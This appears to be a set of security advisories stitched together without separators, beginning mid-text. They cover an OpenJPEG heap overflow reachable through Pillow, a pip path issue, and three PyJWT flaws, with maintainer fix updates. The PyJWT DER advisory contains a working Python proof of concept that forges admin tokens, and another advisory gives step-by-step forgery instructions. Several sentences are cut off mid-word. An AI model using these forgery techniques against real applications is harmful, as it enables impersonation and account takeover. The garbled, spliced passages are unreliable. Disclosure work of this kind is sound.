`2.5.4` as of 2026-10-06.  ## The defect  `src/lib/openjp2/j2k.c`, in `opj_j2k_read_sod`:  ```c OPJ_UINT32 l_current_tile_part =     l_cstr_index->tile_index[p_j2k->m_current_tile_number].current_tpsno; l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_header = l_current_pos; l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_pos   =     l_current_pos + p_j2k->m_specific_param.m_decoder.m_sot_length + 2; ```  `tp_index` is neither null-checked nor bounds-checked, and `l_current_tile_part` comes directly from the one-byte `TPsot` field of the SOT marker.  The correct guard already exists a few lines later in `opj_j2k_add_tlmarker` (j2k.c:8459), writing the **same array at the same index** behind `if (tp_index && l_current_tile_part < nb_tps)`. One writer checked, its sibling not.  Reached by giving the codestream a *valid* TLM marker — so `tp_index` is allocated once by `opj_j2k_build_tp_index_from_tlm`, sized to the TLM entry count, and `opj_j2k_read_sot` then skips all resizing — while setting `TNsot = 0` in every SOT, which keeps the TLM "valid" and lets `TPsot` walk past the allocation.  ## Patch status  Fixed upstream in `91d08b11` ("Fix heap buffer overlfow in opj_j2k_read_sod", 2026-02-10).  The newest OpenJPEG tag is **v2.5.4 (2025-09-20)**, and `compare/v2.5.4...91d08b11` reports *ahead 6, behind 0* — the fix is **in no release, 8 months on**.  ## Suggested remediation  1. Carry `91d08b11` as a patch in the wheel build until an OpenJPEG release includes it — three lines, identical to a guard already present in the same file. 2. Consider asking OpenJPEG to cut a release; they have had an unreleased memory-corruption fix on master since February 2026, and every distro is shipping the vulnerable code. 3. Your security handbook already tells applications to block EPS at the application layer. A similarly explicit note that `Image.open()` ignores filename/Content-Type and will reach any compiled-in codec unless `formats=` is passed would help downstream apps a lot.  ## Not a Pillow bug, but relevant: the extension allowlist most apps rely on does not apply  `Image.open()` sniffs magic bytes, so a JPEG 2000 codestream in a file named `avatar.png` declared `Content-Type: image/png` reaches the JP2 decoder anyway.  I verified this against a production service documenting PNG/JPEG-only uploads: it accepted and fully decoded a JP2 through exactly that path, with 16 formats reachable from one upload endpoint against 43 registered openers. That service has since fixed it by passing `formats=` and validating on the detected format rather than the client's `Content-Type`.  That is the reason a decoder-level issue like this one has much wider reach than downstream maintainers tend to assume.  ### Proof of concept  ASan build of OpenJPEG 2.5.4 interposed under a **stock Pillow 12.3.0**, running `Image.open(p); im.load()`:  ``` ==766332==ERROR: AddressSanitizer: heap-buffer-overflow WRITE of size 8     #0 opj_j2k_read_sod          j2k.c:5086     #1 opj_j2k_read_tile_header  j2k.c:9912     #2 opj_read_tile_header      openjpeg.c:575     #3 j2k_decode_entry          src/libImaging/Jpeg2KDecode.c:793     #4 ImagingJpeg2KDecode       src/libImaging/Jpeg2KDecode.c:949     #5 _decode                   src/decode.c:132 located 8 bytes to the right of a 24-byte region allocated by     opj_j2k_build_tp_index_from_tlm j2k.c:8939 ```  Frames 3–5 are Pillow's own decoder, not a synthetic harness. No non-default decoder options are involved; strict mode is on, which is Pillow's behaviour since Pillow never calls `opj_decoder_set_strict_mode`. A benign twin image runs the same path cleanly and returns a valid image, so this is the payload and not a parse failure.  I have deliberately **not** attached the PoC file to this initial report. I'm happy to attach the PoC, the builder script and the RIP-control harness here on request, or hold everything until a fix is ready.  No disclosure deadline from me; I will not publish anything while this is being worked on.  ### Impact  Any application that calls `Image.open()` / `im.load()` on an image it did not produce — the overwhelmingly common case for upload handlers, thumbnailers and preview pipelines — can be made to perform an out-of-bounds heap write by supplying one crafted file.  **Floor, already certain.** On a stock non-sanitised wheel the overflow performs 245 writes walking to +5856 bytes past a 24-byte allocation, and glibc's own heap-metadata checker aborts the process (`corrupted size vs. prev_size`, `corrupted double-linked list`, SIGABRT). One file reliably kills a long-lived worker.  **Ceiling, demonstrated as a primitive but not as a finished exploit.** With same-size-class objects alive on both sides — an ordinary busy heap — the walk crosses `opj_event_mgr_t`, which holds three `opj_msg_callback` function pointers, and `opj_event_msg` then calls one (event.c:136):  ``` rip  0x4000    <- value chosen by the attacker's file layout rsi  0x3ff2    <- m_error_data, written by the same walk ```  Shifting the codestream with a COM marker moves `rip` with it (`0x16ce` → `0x4000`), so the instruction pointer is attacker-**chosen** rather than incidentally invalid. A benign control image leaves the same groomed heap untouched.  To be explicit about what I did not do: I have **not** built a working exploit. That additionally needs remote heap grooming and an ASLR defeat, and I attempted neither. I am reporting a controlled control-flow primitive, not a finished chain. The CVSS AC:H reflects that.

pip would incorrectly handle doubly-encoded package URLs from indexes allowing for files to be installed to arbitrary locations on disk even when installing wheels.     This vulnerability requires downloading or installing a package from a malicious package index to succeed, malicious packages alone are not able to exploit this vulnerability. Note that this vulnerability only materially impacts users running `pip download` with the `--only-binary` option as installing source distributions from an untrusted index is already an unsafe operation that executes code during install time.

**Prerequisites** (both conditions must hold; both are deployment properties, not attacker-controlled at request time):  - The `jwt.decode` allow-list mixes an HMAC algorithm with an asymmetric one, e.g. `algorithms=["ES256", "HS256"]` (the RFC 8725 footgun the guard exists to backstop). - The verification key is passed as raw PEM text/bytes on the non-`PyJWK` path, in a byte-form that `cryptography`'s loader accepts but PyJWT's `is_pem_format` regex does not recognize (marker-adjacent whitespace/indentation, CR-only line terminators, or the PEM folded to a single line). Such forms arise naturally from an indented YAML/JSON block, a single-line environment variable or JSON string, or a CR/LF round-trip through config tooling.  The attacker additionally needs the public verification key, which is public by definition, and `cryptography` must be installed.  The fix for CVE-2022-29217 rejects an asymmetric key handed to an HMAC algorithm, but only when `is_pem_format()` recognizes the key as PEM. That recognizer accepts strictly fewer byte-forms than the loader that later parses the key, so a PEM the guard misses still loads as a valid public key and is then used as an HMAC secret. This is an incomplete-guard bypass of the CVE-2022-29217 family.  ### Summary A PEM public key with marker-adjacent whitespace, CR-only line terminators, or folded to a single line makes PyJWT's `is_pem_format()` return `False` while `cryptography.load_pem_public_key()` accepts the identical bytes. The asymmetric-key rejection in `HMACAlgorithm.prepare_key` is skipped, the public key becomes the HMAC secret, and an attacker who knows the public key mints a valid `HS256` token — universal forgery — whenever the verify allow-list mixes an HMAC and an asymmetric algorithm.  ### Details At `jwt/algorithms.py:331-335`, `HMACAlgorithm.prepare_key` contains the sole family-mismatch guard:      if is_pem_format(key_bytes) or is_ssh_key(key_bytes):         raise InvalidKeyError(             "The specified key is an asymmetric key or x509 certificate and"             " should not be used as an HMAC secret."         )  If neither predicate fires, `:357` returns `key_bytes` unchanged — the PEM text is used directly as the HMAC secret.  `is_pem_format` (`jwt/utils.py:116-127`) is `bool(_PEM_RE.search(key))`, where `_PEM_RE` requires `----[- ]BEGIN (...)[- ]----?
`, then `.+??
`, then the END marker. The LF in each `?
` is mandatory, the markers are anchored directly after a newline, and only `[- ]` is tolerated adjacent to them — not arbitrary whitespace. So a key with a tab/space before the END marker, with bare `` terminators, or folded onto one line is not recognized as PEM. `cryptography`'s `load_pem_public_key` is tolerant of exactly these forms and still returns the key.  Reach: `jwt/api_jws.py:386` performs the allow-list check (passes when `HS256` is in the list) and takes the non-`PyJWK` branch to `alg_obj.prepare_key(key)` at `:407`. The mismatch guard above is the only thing standing between a mixed allow-list and using the public key as an HMAC secret.  ### PoC Vulnerable path: `jwt/algorithms.py:331` (guard gated on `is_pem_format`) -> `is_pem_format` returns `False` for a loader-accepted PEM -> `jwt/algorithms.py:357` returns the public-key bytes as the HMAC secret -> `HS256` verification succeeds.  Reproduced on PyJWT 2.13.0 (commit `7144e453`) with `cryptography` 49.0.0, using only the public API. For each of an EC (ES256) and an RSA-2048 (RS256) key: start from the correct public-key PEM, apply a mutation, confirm `is_pem_format` now returns `False` while `cryptography` still loads the bytes, then verify a token signed `alg=HS256` with the public-key text as the HMAC secret, under `algorithms=["ES256","HS256"]` (resp. `["RS256","HS256"]`).  Observed output:      pyjwt 2.13.0       ec  canonical (control)                is_pem_format=True  crypto_loads=True  forgery=BLOCKED:InvalidKeyError       ec  marker-adjacent (tab before END)   is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       ec  CR-only terminators                is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       ec  folded single-line                 is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       rsa canonical (control)                is_pem_format=True  crypto_loads=True  forgery=BLOCKED:InvalidKeyError       rsa marker-adjacent (tab before END)   is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       rsa CR-only terminators                is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       rsa folded single-line                 is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       [control B] single-alg [ES256] allow-list vs forged HS256: REJECTED:InvalidAlgorithmError     RESULT: ALL-INVARIANTS-HOLD  Each mutated form on both key types forged a token accepted as `superadmin`. Controls: the unmodified PEM is correctly rejected with `InvalidKeyError` (the guard works and the mutation is load-bearing); a single-algorithm allow-list `["ES256"]` rejects the forged `HS256` token with `InvalidAlgorithmError` (the mixed allow-list is a necessary precondition).  Steps to reproduce: 1. Generate an EC P-256 (or RSA-2048) keypair; serialize the public key to PEM. 2. Mutate the PEM into a loader-accepted, regex-missed form — e.g. insert a tab before `-----END`, convert terminators to bare ``, or join all lines into one. 3. Confirm `jwt.utils.is_pem_format(mutated) is False` and `cryptography.hazmat.primitives.serialization.load_pem_public_key(mutated)` succeeds. 4. `jwt.encode({"sub":"superadmin"}, mutated, algorithm="HS256")`, then `jwt.decode(token, mutated, algorithms=["ES256","HS256"])` — verification succeeds.  ### Impact Cryptographic signature-verification bypass (CWE-347): algorithm confusion re-enabled by an incomplete asymmetric-key guard. An attacker who knows only the public verification key forges arbitrary-claim tokens that verify as authentic, subject to the two deployment preconditions above. The `PyJWK` verification path binds a single algorithm and is unaffected; `enforce_minimum_key_length` (off by default) does not block a 2048-bit/P-256 PEM. Impact when the preconditions hold is critical (universal forgery); the compound precondition is realistic but was not observed in a specific real-world deployment, so this is rated Critical, with the deployment precondition captured in CVSS.  ## Maintainer update — 2026-09-10  We reproduced the reported asymmetric-key guard bypass on PyJWT 2.13.0: PEM public keys with loader-accepted formatting mutations were missed by `is_pem_format`, then accepted as HMAC secrets when a verification call mixed symmetric and asymmetric algorithms. Canonical PEM controls remained blocked, and a single-algorithm allow-list rejected the forged HS256 token.  The fix is committed as `8b4e233a22206b34ec1186e912e75c0b2396ac07`. PyJWT now scans supported PEM BEGIN/END markers in one pass, preserving matching labels and handling overlapping markers without regex backtracking. Regression coverage includes RSA loader-accepted mutations, incomplete repeated markers, later valid PEM blocks, and overlapping END/BEGIN markers. The fix does not broaden DER-key classification or change the caller's algorithm allow-list policy.  Verification on the signed commit passes with 400 tests and 4 intentional cryptography-environment skips; Ruff formatting/lint and the Python 3.9 mypy tox target pass. Fresh Astra/max independent review accepted the final snapshot and confirmed O(n) scanning, bounded storage, and no blocking compatibility or security finding. The fix has not been released; the advisory remains Critical with CVSS 3.1 score 9.1 and CWE-347.  ## Maintainer update — 2026-09-11  The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

### Summary  `PyJWT.decode()`/`decode_complete()` mutates a caller-supplied `options` dict in place whenever `verify_signature` is falsy, adding `verify_exp`/`verify_nbf`/`verify_iat`/`verify_aud`/`verify_iss`/`verify_sub`/`verify_jti` keys directly onto that object. If application code reuses the same `options` dict across calls (a config object, a module-level constant, a wrapper's `self.options`), a later call that explicitly sets `verify_signature=True` for a full, normal verification silently inherits the leftover `verify_exp=False` etc. from an earlier `verify_signature=False` call on the same object -- and accepts an expired, wrong-audience, wrong-issuer, or wrong-subject token as valid with no exception. Signature verification itself is unaffected; this is specifically a claims-check bypass.  This is a regression of an already-fixed, closed issue: originally reported in #679 (2021), fixed in #743 (2022, via a shallow copy of `options`), and silently reintroduced by #1045 (merged 2025-03-05, a typing/logic refactor that dropped the 2022 shallow-copy line). It has been present since #1045 merged, so it likely shipped in several releases already in the wild.  ### Details  File: `jwt/api_jwt.py`, `PyJWT._merge_options()` (called from `decode_complete()`, which backs both `jwt.decode()` and `jwt.decode_complete()`):  ```python def _merge_options(self, options=None):     if options is None:         return self.options     if not options.get("verify_signature", True):         options["verify_exp"] = options.get("verify_exp", False)         options["verify_nbf"] = options.get("verify_nbf", False)         # ...5 more, same pattern -- all written directly onto the caller's dict     return {**self.options, **options} ```  No `dict(options)` copy occurs before these writes, unlike the pre-2025-03-05 code (see #743's fix, `options = dict(options or {})`). Confirmed via `gh api repos/jpadilla/pyjwt/commits/29fbfc36` that #1045's diff removes that line. Confirmed still present on current `main` via a live fetch of `jwt/api_jwt.py`.  ### PoC  Two scripts, each run twice (separate processes), identical output both times (except Python object `id()`), saved locally and available on request:  ```python import jwt, time  INSECURE_OPTIONS = {"verify_signature": False}  secret = "s3cr3t" expired_token = jwt.encode(     {"exp": int(time.time()) - 3600, "data": "x"}, secret, algorithm="HS256" )  jwt.decode(expired_token, options=INSECURE_OPTIONS) print(INSECURE_OPTIONS) # The dict has been silently mutated with 7 new keys, including verify_exp: False.  INSECURE_OPTIONS["verify_signature"] = True result = jwt.decode(expired_token, secret, algorithms=["HS256"], options=INSECURE_OPTIONS) print(result) # No exception raised. Expected: jwt.ExpiredSignatureError, since verify_signature=True # was explicitly requested on this call. ```  Reproduced deterministically across 2 independent process runs.  ### Impact  Preconditions: the calling application must reuse a mutable `options` dict object across two or more `decode()`/`decode_complete()` calls with different intent (e.g. one "insecure peek" call followed by a "fully verified" call on the same dict, config object, or instance attribute). This is a real, plausible pattern but not universal; it does not affect code that constructs a fresh `options` dict per call.  When triggered: a signed-but-expired (or wrong-aud/iss/sub/jti) token is silently accepted as fully verified, with no warning or exception. This is an authentication/claims-verification bypass, not a signature-verification bypass.  Scope: regression present since PR #1045 (merged 2025-03-05), affecting every PyJWT release since then up to and including the current 2.13.0.  Suggested fix: restore a shallow copy inside `_merge_options()` itself (rather than relying on a caller-side copy), so every caller of `_merge_options` is covered:  ```python def _merge_options(self, options=None):     if options is None:         return self.options     options = dict(options)  # never mutate the caller's dict     if not options.get("verify_signature", True):         options.setdefault("verify_exp", False)         options.setdefault("verify_nbf", False)         options.setdefault("verify_iat", False)         options.setdefault("verify_aud", False)         options.setdefault("verify_iss", False)         options.setdefault("verify_sub", False)         options.setdefault("verify_jti", False)     return {**self.options, **options} ```  Found via a property-based audit (copy/clone independence across widely-used Python libraries); both repro scripts were written and independently re-run before this report.  ## Maintainer update — 2026-09-08  We reproduced the reported behavior on PyJWT 2.13.0 at source SHA `7144e4534c34810f4525dc4578a32addd8212cff`. A caller-supplied mutable `options` mapping was modified when `verify_signature` was false; reusing that mapping after re-enabling signature verification could leave registered-claim checks disabled. This is a conditional claim-verification bypass, not a signature-forgery issue.  A narrow fix has been prepared: PyJWT now copies the options mapping before applying defaults. Regression coverage includes `decode()`, `decode_complete()`, constructor input preservation, mutable-mapping compatibility, and reuse of an options mapping across verification modes. The focused tests pass, the full suite passes with 369 tests and 4 intentional cryptography-environment skips, and lint/format/type checks pass.  The advisory remains in triage while the fix goes through release planning. The independently verified range in this investigation is 2.13.0; reports of earlier affected versions should include the exact version and reproduction details.

### Summary  `HMACAlgorithm.prepare_key` blocks asymmetric keys from being used as HMAC secrets by searching for text markers only. It looks for `-----BEGIN` and for an `ssh-` prefix. The same key in DER form is binary ASN.1 and has neither marker, so it passes the check and is used as an HMAC secret.  An application that verifies tokens with an RSA or EC public key, and also allows HS256 with that same key, can be given a forged token. The attacker signs it with the public key, which is public. This is the key confusion problem CVE-2022-29217 was filed for, reachable again through a different encoding.  The reach is smaller than the original CVE. The application must already be in that misconfiguration, and it must hold its public key as DER bytes rather than PEM.  ### Details  The guard is at `jwt/algorithms.py:331`:  ```python if is_pem_format(key_bytes) or is_ssh_key(key_bytes):     raise InvalidKeyError(         "The specified key is an asymmetric key or x509 certificate and"         " should not be used as an HMAC secret."     ) ```  Both helpers are text matchers. Neither one parses the key.  - `jwt/utils.py:126`, `is_pem_format`, runs a regex for `----[- ]BEGIN ...----`. - `jwt/utils.py:141`, `is_ssh_key`, checks `startswith` against a list of `ssh-` and `ecdsa-sha2-` prefixes.  A DER encoded public key starts with the bytes `0x30 0x82`. It matches neither, so `prepare_key` returns it unchanged and it becomes the HMAC secret.  There is no DER handling anywhere in the package. `grep -rni "\bDER\b|load_der" jwt/ tests/` returns nothing.  This affects three encodings that are all blocked in their PEM form today:  - DER SubjectPublicKeyInfo - DER PKCS#1 - DER encoded X.509 certificate  History of this guard:  - Added in 2.4.0 for CVE-2022-29217 and GHSA-ffqj-6fqr-9h24, covering PEM and SSH. - Extended in 2.13.0 for GHSA-xgmm-8j9v-c9wx, covering JWK JSON documents. - DER has never been covered.  Applications that use `PyJWK` or `PyJWKClient` are not affected. `jwt/api_jws.py:395` binds the header `alg` to the key's own algorithm, so HS256 never reaches `HMACAlgorithm.prepare_key` on that path.  Suggested fix: try to parse the bytes as a key and reject if parsing works. For example `load_der_public_key`, `load_der_private_key` and `load_der_x509_certificate` in a try/except chain, next to the checks already there. A random HMAC secret will not parse as valid DER, so real secrets should not be rejected.  ### PoC  Tested on 2.4.0, on 2.13.0, and on main at commit `7144e4534`. All three behave the same. The guard has been marker based since 2.4.0, so the versions in between are very likely affected as well.  ```console pip install "pyjwt==2.13.0" cryptography python poc.py ```  No special configuration is needed. The script builds its own key.  ```python import base64 import hashlib import hmac import json  import jwt from cryptography.hazmat.primitives.asymmetric import rsa from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat  pub = rsa.generate_private_key(public_exponent=65537, key_size=2048).public_key() pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo) der = pub.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo) der_pkcs1 = pub.public_bytes(Encoding.DER, PublicFormat.PKCS1)   def b64(raw):     return base64.urlsafe_b64encode(raw).rstrip(b"=")   def forge(secret):     # The attacker does not use PyJWT. They only need the public key bytes.     head = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())     body = b64(json.dumps({"user": "admin", "role": "admin"}).encode())     signing_input = head + b"." + body     sig = hmac.new(secret, signing_input, hashlib.sha256).digest()     return (signing_input + b"." + b64(sig)).decode()   # PEM form is rejected, as expected since CVE-2022-29217. try:     jwt.decode(forge(pem), pem, algorithms=["RS256", "HS256"]) except jwt.exceptions.InvalidKeyError as exc:     print("PEM rejected:", exc)  # Same key, DER form. The forged token verifies. print("DER SPKI accepted:", jwt.decode(forge(der), der, algorithms=["RS256", "HS256"])) print("DER PKCS#1 accepted:", jwt.decode(forge(der_pkcs1), der_pkcs1, algorithms=["RS256", "HS256"])) ```  Output:  ``` PEM rejected: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC s DER SPKI accepted: {'user': 'admin', 'role': 'admin'} DER PKCS#1 accepted: {'user': 'admin', 'role': 'admin'} ```  The token is signed with plain `hmac`, so this exercises the verify path only. The PEM and the DER values come from the same key object, so the encoding is the only thing that changes.  We also have a regression test written in your pytest style. It uses your own `tests/keys` fixtures, covers the DER certificate case too, and fails on current main. Glad to send it or open a PR.  ### Impact  Key confusion, CWE-347, improper verification of a cryptographic signature. Same class as CVE-2022-29217.  Who is affected: applications that verify tokens with an asymmetric public key, also list an HS\* algorithm  pass that public key to `jwt.decode` as DER bytes.  What an attacker gets: they can mint tokens with any claims they want, so they can log in as any user. They  is public, and they re-encode it to DER. Nothing secret has to be stolen first.  What limits it: the application must already be in the mixed HS\* and RS\* misconfiguration. It must also hoEM is the more common form and is still blocked. Private-key container formats are outside this fix scope.  ## Maintainer update — 2026-09-11  The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI.
